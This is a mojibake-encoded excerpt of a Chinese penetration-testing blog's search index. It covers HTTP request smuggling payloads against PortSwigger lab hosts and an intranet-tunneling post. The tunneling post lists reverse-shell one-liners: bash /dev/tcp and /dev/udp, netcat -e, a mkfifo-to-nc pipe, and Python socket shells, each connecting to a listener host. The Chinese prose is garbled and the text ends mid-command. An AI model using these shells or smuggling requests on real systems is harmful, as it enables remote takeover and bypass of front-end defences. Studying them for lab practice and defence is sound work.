çš„å—ç»“æŸï¼Œä¹Ÿå°±æ˜¯è¯´è§£æé‡åˆ° 0 æ•°æ®å—å°±ç»“æŸã€‚å¦‚ï¼š POST / HTTP/1.1 Host: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net Content-Type: application/x-www-form-urlencoded Transfer-Encoding: chunked b a=11 0 å…¶å®ç†è§£èµ·æ¥çœŸçš„å¾ˆç®€å•ï¼Œç›¸å½“äºæˆ‘å‘é€è¯·æ±‚ï¼ŒåŒ…å«Content-Lengthï¼Œå‰ç«¯æœåŠ¡å™¨è§£æåæ²¡æœ‰é—®é¢˜å‘é€ç»™åç«¯æœåŠ¡å™¨ï¼Œä½†æ˜¯æˆ‘åœ¨è¯·æ±‚æ—¶åé¢è¿˜åŒ…å«äº†Transfer-Encodingï¼Œè¿™æ ·åç«¯æœåŠ¡å™¨è¿›è¡Œè§£æä¾¿å¯æ‰§è¡Œæˆ‘å†™åœ¨ä¸‹é¢çš„ä¸€äº›å‘½ä»¤ï¼Œè¿™æ ·ä¾¿å¯ä»¥ç»•è¿‡å‰ç«¯çš„ wafã€‚ ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:1:3","tags":["æ¸—é€æµ‹è¯•"],"title":"HTTP è¯·æ±‚èµ°ç§","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2 å®ä¾‹ ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:2:0","tags":["æ¸—é€æµ‹è¯•"],"title":"HTTP è¯·æ±‚èµ°ç§","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.1 CL ä¸ä¸º 0 çš„ GET è¯·æ±‚ å‡è®¾å‰ç«¯ä»£ç†æœåŠ¡å™¨å…è®¸ GET è¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œè€Œåç«¯æœåŠ¡å™¨ä¸å…è®¸ GET è¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œå®ƒä¼šç›´æ¥å¿½ç•¥æ‰ GET è¯·æ±‚ä¸­çš„ Content-Length å¤´ï¼Œä¸è¿›è¡Œå¤„ç†ã€‚è¿™å°±æœ‰å¯èƒ½å¯¼è‡´è¯·æ±‚èµ°ç§ã€‚ æ¯”å¦‚æˆ‘ä»¬æ„é€ è¯·æ±‚ï¼š GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-Length: 44\\r\\n GET / secret HTTP/1.1\\r\\n Host: example.com\\r\\n \\r\\n å‰ç«¯æœåŠ¡å™¨æ”¶åˆ°è¯¥è¯·æ±‚ï¼Œé€šè¿‡è¯»å– Content-Lengthï¼Œåˆ¤æ–­è¿™æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œç„¶åè½¬å‘ç»™åç«¯æœåŠ¡å™¨ï¼Œè€Œåç«¯æœåŠ¡å™¨æ”¶åˆ°åï¼Œå› ä¸ºå®ƒä¸å¯¹ Content-Length è¿›è¡Œå¤„ç†ï¼Œç”±äº Pipeline çš„å­˜åœ¨ï¼Œå®ƒå°±è®¤ä¸ºè¿™æ˜¯æ”¶åˆ°äº†ä¸¤ä¸ªè¯·æ±‚ï¼Œåˆ†åˆ«æ˜¯ # ç¬¬ä¸€ä¸ª GET / HTTP/1.1\\r\\n Host: example.com\\r\\n # ç¬¬äºŒä¸ª GET /secret HTTP/1.1\\r\\n Host: example.com\\r\\n ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:2:1","tags":["æ¸—é€æµ‹è¯•"],"title":"HTTP è¯·æ±‚èµ°ç§","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.2 CL-CL åœ¨ RFC7230 çš„ç¬¬ 3.3.3 èŠ‚ä¸­çš„ç¬¬å››æ¡ä¸­ï¼Œè§„å®šå½“æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ä¸­åŒ…å«ä¸¤ä¸ª Content-Lengthï¼Œè€Œä¸”ä¸¤è€…çš„å€¼ä¸åŒæ—¶ï¼Œéœ€è¦è¿”å› 400 é”™è¯¯ã€‚ ä½†æ˜¯æ€»æœ‰æœåŠ¡å™¨ä¸ä¼šä¸¥æ ¼çš„å®ç°è¯¥è§„èŒƒï¼Œå‡è®¾ä¸­é—´çš„ä»£ç†æœåŠ¡å™¨å’Œåç«¯çš„æºç«™æœåŠ¡å™¨åœ¨æ”¶åˆ°ç±»ä¼¼çš„è¯·æ±‚æ—¶ï¼Œéƒ½ä¸ä¼šè¿”å› 400 é”™è¯¯ï¼Œä½†æ˜¯ä¸­é—´ä»£ç†æœåŠ¡å™¨æŒ‰ç…§ç¬¬ä¸€ä¸ª Content-Length çš„å€¼å¯¹è¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œè€Œåç«¯æºç«™æœåŠ¡å™¨æŒ‰ç…§ç¬¬äºŒä¸ª Content-Length çš„å€¼è¿›è¡Œå¤„ç†ã€‚ æ­¤æ—¶æ¶æ„æ”»å‡»è€…å¯ä»¥æ„é€ ä¸€ä¸ªç‰¹æ®Šçš„è¯·æ±‚ï¼š POST / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-Length: 8\\r\\n Content-Length: 7\\r\\n 12345\\r\\n a ä¸­é—´ä»£ç†æœåŠ¡å™¨è·å–åˆ°çš„æ•°æ®åŒ…çš„é•¿åº¦ä¸º 8ï¼Œå°†ä¸Šè¿°æ•´ä¸ªæ•°æ®åŒ…åŸå°ä¸åŠ¨çš„è½¬å‘ç»™åç«¯çš„æºç«™æœåŠ¡å™¨ï¼Œè€Œåç«¯æœåŠ¡å™¨è·å–åˆ°çš„æ•°æ®åŒ…é•¿åº¦ä¸º 7ã€‚å½“è¯»å–å®Œå‰ 7ä¸ªå­—ç¬¦åï¼Œåç«¯æœåŠ¡å™¨è®¤ä¸ºå·²ç»è¯»å–å®Œæ¯•ï¼Œç„¶åç”Ÿæˆå¯¹åº”çš„å“åº”ï¼Œå‘é€å‡ºå»ã€‚è€Œæ­¤æ—¶çš„ç¼“å†²åŒºå»è¿˜å‰©ä½™ä¸€ä¸ªå­—æ¯ aï¼Œå¯¹äºåç«¯æœåŠ¡å™¨æ¥è¯´ï¼Œè¿™ä¸ª a æ˜¯ä¸‹ä¸€ä¸ªè¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰ä¼ è¾“å®Œæ¯•ã€‚æ­¤æ—¶æ°å·§æœ‰ä¸€ä¸ªå…¶å®ƒçš„æ­£å¸¸ç”¨æˆ·å¯¹æœåŠ¡å™¨è¿›è¡Œäº†è¯·æ±‚ï¼Œå‡è®¾è¯·æ±‚å¦‚å›¾æ‰€ç¤ºï¼š GET /index.html HTTP/1.1\\r\\n Host: example.com\\r\\n ä»å‰é¢æˆ‘ä»¬ä¹ŸçŸ¥é“äº†ï¼Œä»£ç†æœåŠ¡å™¨ä¸æºç«™æœåŠ¡å™¨ä¹‹é—´ä¸€èˆ¬ä¼šé‡ç”¨ TCP è¿æ¥ã€‚ è¿™æ—¶å€™æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚å°±æ‹¼æ¥åˆ°äº†å­—æ¯ a çš„åé¢ï¼Œå½“åç«¯æœåŠ¡å™¨æ¥æ”¶å®Œæ¯•åï¼Œå®ƒå®é™…å¤„ç†çš„è¯·æ±‚å…¶å®æ˜¯ï¼š aGET /index.html HTTP/1.1\\r\\n Host: example.com\\r\\n è¿™æ—¶å€™ç”¨æˆ·å°±ä¼šæ”¶åˆ°ä¸€ä¸ªç±»ä¼¼äº aGET request method not found çš„æŠ¥é”™ã€‚è¿™æ ·å°±å®ç°äº†ä¸€æ¬¡ HTTP èµ°ç§æ”»å‡»ï¼Œè€Œä¸”è¿˜å¯¹æ­£å¸¸ç”¨æˆ·çš„è¡Œä¸ºé€ æˆäº†å½±å“ï¼Œè€Œä¸”åç»­å¯ä»¥æ‰©å±•æˆç±»ä¼¼äº CSRF çš„æ”»å‡»æ–¹å¼ã€‚ ä½†æ˜¯ä¸¤ä¸ª Content-Length è¿™ç§è¯·æ±‚åŒ…è¿˜æ˜¯å¤ªè¿‡äºç†æƒ³åŒ–äº†ï¼Œä¸€èˆ¬çš„æœåŠ¡å™¨éƒ½ä¸ä¼šæ¥å—è¿™ç§å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…ã€‚ä½†æ˜¯åœ¨ RFC2616 çš„ç¬¬ 4.4 èŠ‚ä¸­ï¼Œè§„å®š:å¦‚æœæ”¶åˆ°åŒæ—¶å­˜åœ¨ Content-Length å’Œ Transfer-Encoding è¿™ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œåœ¨å¤„ç†çš„æ—¶å€™å¿…é¡»å¿½ç•¥ Content-Lengthï¼Œè¿™å…¶å®ä¹Ÿå°±æ„å‘³ç€è¯·æ±‚åŒ…ä¸­åŒæ—¶åŒ…å«è¿™ä¸¤ä¸ªè¯·æ±‚å¤´å¹¶ä¸ç®—è¿è§„ï¼ŒæœåŠ¡å™¨ä¹Ÿä¸éœ€è¦è¿”å› 400 é”™è¯¯ã€‚æœåŠ¡å™¨åœ¨è¿™é‡Œçš„å®ç°æ›´å®¹æ˜“å‡ºé—®é¢˜ã€‚ ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:2:2","tags":["æ¸—é€æµ‹è¯•"],"title":"HTTP è¯·æ±‚èµ°ç§","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.3 CL-TE æ‰€è°“CL-TEï¼Œå°±æ˜¯å½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œå‰ç«¯ä»£ç†æœåŠ¡å™¨åªå¤„ç† Content-Length è¿™ä¸€è¯·æ±‚å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä¼šéµå®ˆ RFC2616 çš„è§„å®šï¼Œå¿½ç•¥æ‰ Content-Lengthï¼Œå¤„ç† Transfer-Encoding è¿™ä¸€è¯·æ±‚å¤´ã€‚ chunk ä¼ è¾“æ•°æ®æ ¼å¼å¦‚ä¸‹ï¼Œå…¶ä¸­ size çš„å€¼ç”± 16 è¿›åˆ¶è¡¨ç¤ºã€‚ Lab åœ°å€ï¼šhttps://portswigger.net/web-security/request-smuggling/lab-basic-cl-te æ„é€ æ•°æ®åŒ…ï¼š POST / HTTP/1.1\\r\\n Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\\r\\n Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n Accept-Language: en-US,en;q=0.5\\r\\n Cookie: session=E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3\\r\\n Connection: keep-alive\\r\\n Content-Length: 6\\r\\n Transfer-Encoding: chunked\\r\\n \\r\\n 0\\r\\n \\r\\n G è¿ç»­å‘é€å‡ æ¬¡è¯·æ±‚å°±å¯ä»¥è·å¾—è¯¥å“åº”ï¼š ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:2:3","tags":["æ¸—é€æµ‹è¯•"],"title":"HTTP è¯·æ±‚èµ°ç§","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.4 TE-CL æ‰€è°“ TE-CLï¼Œå°±æ˜¯å½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œå‰ç«¯ä»£ç†æœåŠ¡å™¨å¤„ç† Transfer-Encoding è¿™ä¸€è¯·æ±‚å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨å¤„ç† Content-Length è¯·æ±‚å¤´ã€‚ Labåœ°å€ï¼šhttps://portswigger.net/web-security/request-smuggling/lab-basic-te-cl æ„é€ æ•°æ®åŒ…ï¼š POST / HTTP/1.1\\r\\n Host: ac041f531eabd0cd804edb62000c0025.web-security-academy.net\\r\\n Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n Accept-Language: en-US,en;q=0.5\\r\\n Cookie: session=3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew\\r\\n Content-Length: 4\\r\\n Transfer-Encoding: chunked\\r\\n \\r\\n 12\\r\\n GPOST / HTTP/1.1\\r\\n \\r\\n 0\\r\\n \\r\\n ç”±äºå‰ç«¯æœåŠ¡å™¨å¤„ç† Transfer-Encodingï¼Œå½“å…¶è¯»å–åˆ° 0\\r\\n\\r\\næ—¶ï¼Œè®¤ä¸ºæ˜¯è¯»å–å®Œæ¯•äº†ï¼Œæ­¤æ—¶è¿™ä¸ªè¯·æ±‚å¯¹ä»£ç†æœåŠ¡å™¨æ¥è¯´æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œç„¶åè½¬å‘ç»™åç«¯æœåŠ¡å™¨ï¼Œåç«¯æœåŠ¡å™¨å¤„ç† Content-Length è¯·æ±‚å¤´ï¼Œå½“å®ƒè¯»å–å®Œ 5c\\r\\n ä¹‹åï¼Œå°±è®¤ä¸ºè¿™ä¸ªè¯·æ±‚å·²ç»ç»“æŸäº†ï¼Œåé¢çš„æ•°æ®å°±è®¤ä¸ºæ˜¯å¦ä¸€ä¸ªè¯·æ±‚äº†ï¼Œä¹Ÿå°±æ˜¯ï¼š GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:2:4","tags":["æ¸—é€æµ‹è¯•"],"title":"HTTP è¯·æ±‚èµ°ç§","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.5 TE-TE TE-TEï¼Œä¹Ÿå¾ˆå®¹æ˜“ç†è§£ï¼Œå½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œå‰åç«¯æœåŠ¡å™¨éƒ½å¤„ç† Transfer-Encoding è¯·æ±‚å¤´ï¼Œè¿™ç¡®å®æ˜¯å®ç°äº† RFC çš„æ ‡å‡†ã€‚ä¸è¿‡å‰åç«¯æœåŠ¡å™¨æ¯•ç«Ÿä¸æ˜¯åŒä¸€ç§ï¼Œè¿™å°±æœ‰äº†ä¸€ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹å‘é€çš„è¯·æ±‚åŒ…ä¸­çš„ Transfer-Encoding è¿›è¡ŒæŸç§æ··æ·†æ“ä½œï¼Œä»è€Œä½¿å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ä¸å¤„ç† Transfer-Encoding è¯·æ±‚å¤´ã€‚ä»æŸç§æ„ä¹‰ä¸Šè¿˜æ˜¯ CL-TE æˆ–è€… TE-CLã€‚ Labåœ°å€ï¼šhttps://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header æ„é€ æ•°æ®åŒ…ï¼š POST / HTTP/1.1\\r\\n Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\\r\\n User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\\r\\n Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n Accept-Language: en-US,en;q=0.5\\r\\n Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\\r\\n Content-length: 4\\r\\n Transfer-Encoding: chunked\\r\\n Transfer-encoding: cow\\r\\n \\r\\n 5c\\r\\n GPOST / HTTP/1.1\\r\\n Content-Type: application/x-www-form-urlencoded\\r\\n Content-Length: 15\\r\\n \\r\\n x=1\\r\\n 0\\r\\n \\r\\n ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:2:5","tags":["æ¸—é€æµ‹è¯•"],"title":"HTTP è¯·æ±‚èµ°ç§","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å†…ç½‘éš§é“ç©¿é€","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å†…ç½‘éš§é“ç©¿é€ ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1 åœºæ™¯ä»‹ç» ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.1 ç›¸å…³æ¦‚å¿µ å†…ç½‘ç©¿é€æ˜¯ï¼šåˆ©ç”¨å„ç§éš§é“æŠ€æœ¯ï¼Œå¯»æ‰¾é˜²ç«å¢™å…è®¸çš„åè®®ï¼Œæ··æ‚åœ¨æ­£å¸¸æµé‡ä¸­ç©¿é€ï¼Œç»•è¿‡ç½‘ç»œé˜²ç«å¢™çš„å°é”ï¼Œå®ç°è®¿é—®è¢«å°é”çš„ç›®æ ‡ç½‘ç»œã€‚ è¢«å°è£…çš„æ•°æ®åŒ…åœ¨éš§é“çš„ä¸¤ä¸ªç«¯ç‚¹ä¹‹é—´é€šè¿‡å…¬å…±äº’è”ç½‘ç»œè¿›è¡Œè·¯ç”±ã€‚è¢«å°è£…çš„æ•°æ®åŒ…åœ¨å…¬å…±äº’è”ç½‘ç»œä¸Šä¼ é€’æ—¶æ‰€ç»è¿‡çš„é€»è¾‘è·¯å¾„ç§°ä¸ºéš§é“ã€‚ä¸€æ—¦åˆ°è¾¾ç½‘ç»œç»ˆç‚¹ï¼Œæ•°æ®å°†è¢«è§£åŒ…å¹¶è½¬å‘åˆ°æœ€ç»ˆç›®çš„åœ°ã€‚æ³¨æ„éš§é“æŠ€æœ¯æ˜¯æŒ‡åŒ…æ‹¬æ•°æ®å°è£…ã€ä¼ è¾“å’Œè§£åŒ…åœ¨å†…çš„å…¨è¿‡ç¨‹ã€‚ éš§é“åè®®çš„ä¸»è¦ä½œç”¨åŒ…æ‹¬ï¼šè§„é¿é˜²ç«å¢™ã€åŠ å¯†ç½‘ç»œæµé‡ã€‚ å¸¸è§çš„éš§é“åˆ—ä¸¾å¦‚ä¸‹ï¼š åº”ç”¨å±‚ï¼šSSHã€HTTPã€HTTPSã€DNSã€‚ ä¼ è¾“å±‚ï¼šTCPã€UDPã€å¸¸è§„ç«¯å£è½¬å‘ã€‚ ç½‘ç»œå±‚ï¼šIPv6ã€ICMPã€GREã€‚ ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:1:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.2 æ­£å‘ä»£ç† \u0026 åå‘ä»£ç† æ­£å‘ä»£ç†ä¸­ï¼Œproxy å’Œ client åŒå±ä¸€ä¸ª LANï¼Œå¯¹ server é€æ˜ï¼› åå‘ä»£ç†ä¸­ï¼Œproxy å’Œ server åŒå±ä¸€ä¸ª LANï¼Œå¯¹ client é€æ˜ã€‚ å®é™…ä¸Š proxy åœ¨ä¸¤ç§ä»£ç†ä¸­åšçš„äº‹éƒ½æ˜¯ä»£ä¸ºæ”¶å‘è¯·æ±‚å’Œå“åº”ï¼Œä¸è¿‡ä»ç»“æ„ä¸Šæ¥çœ‹æ­£å¥½å·¦å³äº’æ¢äº†ä¸‹ï¼Œæ‰€ä»¥æŠŠå‰è€…é‚£ç§ä»£ç†æ–¹å¼å«åšæ­£å‘ä»£ç†ï¼Œåè€…å«åšåå‘ä»£ç†ã€‚ 1.2.1 æ­£å‘ä»£ç† Lhost -\u003e proxy -\u003e Rhost Lhost ä¸ºäº†è®¿é—®åˆ° Rhostï¼Œå‘ proxy å‘é€äº†ä¸€ä¸ªè¯·æ±‚å¹¶ä¸”æŒ‡å®šç›®æ ‡æ˜¯ Rhostï¼Œç„¶å proxy å‘ Rhost è½¬äº¤è¯·æ±‚å¹¶å°†è·å¾—çš„å†…å®¹è¿”å›ç»™ Lhostï¼Œç®€å•æ¥è¯´æ­£å‘ä»£ç†å°±æ˜¯ proxy ä»£æ›¿äº†æˆ‘ä»¬å»è®¿é—® Rhostã€‚ 1.2.2 åå‘ä»£ç† Lhost \u003c----\u003e proxy \u003c----\u003e firewall \u003c----\u003e Rhost å’Œæ­£å‘ä»£ç†ç›¸åï¼ŒLhost åªå‘ proxy å‘é€æ™®é€šçš„è¯·æ±‚ï¼Œå…·ä½“è®©å®ƒè½¬åˆ°å“ªé‡Œï¼Œproxy è‡ªå·±åˆ¤æ–­ï¼Œç„¶åå°†è¿”å›çš„æ•°æ®é€’äº¤å›æ¥ï¼Œè¿™æ ·çš„å¥½å¤„å°±æ˜¯åœ¨æŸäº›é˜²ç«å¢™åªå…è®¸ proxy æ•°æ®è¿›å‡ºçš„æ—¶å€™å¯ä»¥æœ‰æ•ˆçš„è¿›è¡Œç©¿é€ ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:1:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.3 è½¬å‘åœºæ™¯ 1.3.1 å¸¸è§çš„åœºæ™¯ å®‰å…¨è¿ç»´ï¼šç»•è¿‡å ¡å’æœºæˆ–é˜²ç«å¢™å®ç°å¯¹å†…ç½‘æœåŠ¡å™¨è¿›è¡Œè¿œç¨‹ç®¡ç† å†…ç½‘æ¸—é€ï¼šç»•è¿‡å ¡å’æœºæˆ–é˜²ç«å¢™å®ç°å¯¹å†…ç½‘æœåŠ¡å™¨è¿›è¡Œæ”»å‡» ç›®æ ‡å¤„äºç½‘ç»œè¾¹ç•Œï¼Œå†…å¤–ç½‘éƒ½å¯ä»¥è®¿é—®ï¼Œç½‘ç»œè¾¹ç•Œä¸»æœºæœªå®‰è£…é˜²ç«å¢™ï¼Œæ‰€æœ‰ç«¯å£éƒ½å¯¹äº’è”ç½‘å¼€æ”¾ï¼Œæ­¤ç±»ä¸šåŠ¡åœºæ™¯å·²ç»æå°‘å‡ºç°ã€‚ ç›®æ ‡å¤„äºå†…ç½‘ï¼Œå…è®¸ç‰¹å®šçš„åº”ç”¨å±‚åè®®å‡ºç½‘(æ¯”å¦‚ HTTPã€SSHã€DNS)ç­‰åº”ç”¨å±‚åè®®(3389ã€22ã€445ã€53ã€80ã€443ç­‰)ã€‚ ç›®æ ‡å¤„äºå†…ç½‘ï¼Œä¸èƒ½è®¿é—®å¤–ç½‘ï¼Œä½†æ˜¯å¯ä»¥è®¿é—®è¾¹ç•Œä¸»æœºï¼Œé˜²ç«å¢™ç­–ç•¥é™åˆ¶å¤–éƒ¨ç½‘ç»œç›´æ¥è®¿é—®å†…ç½‘çš„æ•æ„Ÿç«¯å£(3389ã€22ã€445 ç­‰)ã€‚ å¸¸è§çš„è½¬å‘æ–¹å¼ï¼š åå¼¹ç«¯å£ åå¼¹ shell socks ä»£ç† 1.3.2 é˜²ç«å¢™è§„åˆ™ å…¥ç½‘ ç‰¹å®šçš„ç«¯å£æ˜ å°„ 80:80 å‡ºç½‘ ICMP å…è®¸ç‰¹å®šçš„åè®®(HTTPã€DNSã€SSHã€RDP) å…è®¸ç‰¹å®šç«¯å£(å…ˆä¸»æµç«¯å£ï¼Œå†å…¨ç«¯å£) 1.3.3 è¿é€šæ€§æ£€æµ‹ åœ¨å»ºç«‹éš§é“å‰ï¼Œé¦–å…ˆè¦æ£€æµ‹ç›®æ ‡æœºå™¨æ˜¯å¦èƒ½å‡ºç½‘ã€ä»€ä¹ˆåè®®å¯ä»¥å‡ºç½‘ã€‚æ‰‹åŠ¨æ£€æµ‹è¾ƒéº»çƒ¦ï¼Œæ‰€ä»¥å°±æœ‰äº†è¿™ä¸ªå·¥å…·ï¼Œå¯é…åˆå¦‚ wmiexecã€psexec ç­‰æ¨ªå‘å·¥å…·è¿›è¡Œæ‰¹é‡æ£€æµ‹ï¼Œè¯¥å·¥å…·å¯ä»¥åœ¨ dnslog ä¸­å›æ˜¾å†…ç½‘ ip åœ°å€å’Œè®¡ç®—æœºåï¼Œå¯å®ç°å†…ç½‘ä¸­çš„å¿«é€Ÿå®šä½å¯å‡ºç½‘æœºå™¨ã€‚ å·¥å…·ï¼šhttps://github.com/uknowsec/SharpNetCheck Usage: SharpNetCheck -dns -host ceye.io SharpNetCheck -http -host/ip ceye.io SharpNetCheck -all -host ceye.io ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:1:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2 åå¼¹ shell ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.1 Bash 2.1.1 Bash TCP bash -i \u003e\u0026 /dev/tcp/ip/port 0\u003e\u00261 bash -i \u003e /dev/tcp/ip/port 0\u003c\u0026 2\u003e\u00261 exec 5\u003c\u003e/dev/tcp/ip/port;cat \u003c\u00265 | while read line; do $line 2\u003e\u00265 \u003e\u00265; done exec /bin/sh 0\u003c/dev/tcp/ip/port 1\u003e\u00260 2\u003e\u00260 0\u003c\u0026196;exec 196\u003c\u003e/dev/tcp/ip/port; sh \u003c\u0026196 \u003e\u0026196 2\u003e\u0026196 2.1.2 Bash UDP Victim: sh -i \u003e\u0026 /dev/udp/10.0.0.1/4242 0\u003e\u00261 Listener: nc -u -lvp 4242 ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:2:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.2 åº”ç”¨å†…åå¼¹ shell 2.2.1 netcat ncat ip port -e /bin/bash nc -e /bin/bash ip port rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc ip port \u003e/tmp/f rm -f x; mknod x p \u0026\u0026 nc ip port 0\u003cx | /bin/bash 1\u003ex 2.2.2 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' # windows only python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",port,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); 